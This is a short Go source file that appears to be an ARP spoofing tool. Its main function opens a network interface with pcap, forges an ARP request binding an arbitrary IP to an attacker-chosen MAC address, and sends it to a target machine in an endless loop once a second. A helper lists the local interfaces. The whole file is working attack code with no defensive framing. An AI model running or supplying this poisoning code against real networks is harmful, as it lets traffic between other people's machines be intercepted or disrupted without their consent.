package arp

import (
	"fmt"
	"github.com/google/gopacket/pcap"
	marp "github.com/mdlayher/arp"
	"github.com/mdlayher/ethernet"
	"net"
	"time"
)

func Do(interfaceName string,
	targetMACString string,
	spoofedIPString string,
	spoofMACString string) error {
	handler, err := pcap.OpenLive(interfaceName, 65535, true, pcap.BlockForever)
	if err != nil {
		return err
	}
	defer handler.Close()

	targetMAC, err := net.ParseMAC(targetMACString)
	spoofedIP := net.ParseIP(spoofedIPString)
	spoofMAC, err := net.ParseMAC(spoofMACString)

	var ethernetFrameBinary []byte

	if arpPacket, err := marp.NewPacket(marp.OperationRequest, spoofMAC, spoofedIP, spoofMAC, spoofedIP); err == nil {
		if arpPacketBinary, err := arpPacket.MarshalBinary(); err == nil {
			ethernetFrame := &ethernet.Frame{
				Destination: targetMAC,
				Source:      arpPacket.SenderHardwareAddr,
				EtherType:   ethernet.EtherTypeARP,
				Payload:     arpPacketBinary,
			}

			if ethernetFrameBinary, err = ethernetFrame.MarshalBinary(); err != nil {
				return err
			}
		} else {
			return err
		}
	} else {
		return err
	}

	for {
		fmt.Print(spoofedIPString, " -> ", spoofMACString, ", err = ")
		fmt.Println(handler.WritePacketData(ethernetFrameBinary))

		time.Sleep(time.Second)
	}
}

func ListInterfaces() {
	interfaces, _ := pcap.FindAllDevs()
	for _, currentInterface := range interfaces {
		fmt.Print("\"", currentInterface.Name, "\" with human readable name ", currentInterface.Description, " has IP addresses ")
		for _, address := range currentInterface.Addresses {
			cidr, _ := address.Netmask.Size()
			fmt.Print(address.IP, "/", cidr, ", ")
		}
		fmt.Println()
	}
}
